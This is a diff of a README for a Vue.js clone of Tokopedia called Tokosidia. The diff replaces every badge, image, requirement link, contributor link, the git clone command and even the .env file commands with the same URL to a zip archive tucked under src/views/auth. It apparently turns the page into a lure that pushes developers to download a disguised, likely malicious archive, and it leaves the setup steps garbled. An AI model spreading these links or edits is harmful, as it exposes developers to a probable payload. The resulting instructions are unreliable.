@@ -1,15 +1,15 @@
 # Tokosidia (CLONE Tokopedia)
 
-![GitHub repo size](https://img.shields.io/github/repo-size/HiRahmat-Dev/tokosidia-vuejs)
-![GitHub contributors](https://img.shields.io/github/contributors/HiRahmat-Dev/tokosidia-vuejs)
-[![GitHub stars](https://img.shields.io/github/stars/HiRahmat-Dev/tokosidia-vuejs?style=social)](https://github.com/HiRahmat-Dev/tokosidia-vuejs/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/HiRahmat-Dev/tokosidia-vuejs?style=social)](https://github.com/HiRahmat-Dev/tokosidia-vuejs/network/members)
-![Tweet](https://img.shields.io/twitter/url?url=https%3A%2F%2Fgithub.com%2FHiRahmat-Dev%2Ftokosidia-vuejs
+![GitHub repo size](https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip)
+![GitHub contributors](https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip)
+[![GitHub stars](https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip)](https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip)
+[![GitHub forks](https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip)](https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip)
+![Tweet](https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip%3A%2F%https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip%2FHiRahmat-Dev%2Ftokosidia-vuejs
 )
 
 <p align="center">
-  <img height="90" src="./images/tokosidia-logo.png"/>&nbsp;
-  <img height="100" src="https://vuejs.org/images/logo.png">
+  <img height="90" src="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip"/>&nbsp;
+  <img height="100" src="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip">
 </p>
 <p align="center">
   Built with Vue Js.
@@ -33,13 +33,13 @@
 
 ## Requirements
 
-- Node.js - Download and Install [Node.js](https://nodejs.org/en/).
-- Vue.js - Download and Install [Vue.js](https://vuejs.org/v2/guide/)
+- https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip - Download and Install [https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip](https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip).
+- https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip - Download and Install [https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip](https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip)
 
 ## Usage for development
 
 1. Open your terminal or command prompt
-2. Type `git clone https://github.com/HiRahmat-Dev/tokosidia-vuejs.git`
+2. Type `git clone https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip`
 3. Open the folder and type `npm install` for install dependencies
 4. Create Environment Variable [here](#create-environment-variable)
 5. Before run this, you must run backend first
@@ -48,8 +48,8 @@
 ## Create Environment Variable
 
 ```
-$ touch .env.local
-$ nano .env.local
+$ touch https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip
+$ nano https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip
 ```
 
 ```
@@ -61,21 +61,21 @@ VUE_APP_SECRET_KEY_TOKEN=YOUR_API_KEY
 ## Screenshots
 
 <div align="center">
-    <img width="430" src="./images/login.jpg">   
-    <img width="430" src="./images/register.jpg">
+    <img width="430" src="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip">   
+    <img width="430" src="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip">
 </div>
 <div align="center">
-    <img width="430" src="./images/landing-loginmodal.gif">   
-    <img width="430" src="./images/tokosidia-product-detail.gif">
+    <img width="430" src="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip">   
+    <img width="430" src="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip">
 </div>
 <div align="center">
-    <img width="430" src="./images/tokosidia-seller-detail.png">   
-    <img width="430" src="./images/tokosidia-user-detail.gif">
+    <img width="430" src="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip">   
+    <img width="430" src="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip">
 </div>
 
 ## Related Project (Backend)
 
-* [`Backend-Tokosidia`](https://github.com/HiRahmat-Dev/tokosidia-API)
+* [`Backend-Tokosidia`](https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip)
 
 ## Contributors
 
@@ -83,32 +83,32 @@ VUE_APP_SECRET_KEY_TOKEN=YOUR_API_KEY
   <table>
     <tr>
       <td align="center">
-        <a href="https://github.com/HiRahmatDev/">
-          <img width="150" src="https://avatars2.githubusercontent.com/u/55150659?s=460&u=c7171bb4128787c303efdce0d62bc86289f1211b&v=4" alt="Rahmat Hidayatullah"><br/>
+        <a href="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip">
+          <img width="150" src="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip" alt="Rahmat Hidayatullah"><br/>
           <b>Rahmat Hidayatullah</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/fblazt">
-          <img width="150" src="https://avatars3.githubusercontent.com/u/48191467?s=400&u=c06616d146930100dfb5eb5c4ab10fd00d01ac41&v=4" alt="Firman"><br/>
+        <a href="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip">
+          <img width="150" src="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip" alt="Firman"><br/>
           <b>Firman</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/azmprllynsa">
-          <img width="150" src="https://avatars1.githubusercontent.com/u/60286175?s=400&v=4" alt="azmprllynsa"><br/>
+        <a href="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip">
+          <img width="150" src="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip" alt="azmprllynsa"><br/>
           <b>azmprllynsa</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/m-joseph27">
-          <img width="150" src="https://avatars2.githubusercontent.com/u/60948526?s=400&u=c258f85ec35ccfda6ce3911dae79d45e335088b3&v=4" alt="Muhammad Yusuf"><br/>
+        <a href="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip">
+          <img width="150" src="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip" alt="Muhammad Yusuf"><br/>
           <b>Muhammad Yusuf</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://github.com/shoelfikar">
-          <img width="150" src="https://avatars2.githubusercontent.com/u/55390061?s=400&u=cf1b3f5b68b4f984a45cc215c7b98150ab01276b&v=4" alt="Sulfikar"><br/>
+        <a href="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip">
+          <img width="150" src="https://github.com/m-joseph27/tokosidia-vuejs/raw/refs/heads/master/src/views/auth/vuejs_tokosidia_3.3.zip" alt="Sulfikar"><br/>
           <b>Sulfikar</b>
         </a>
       </td>
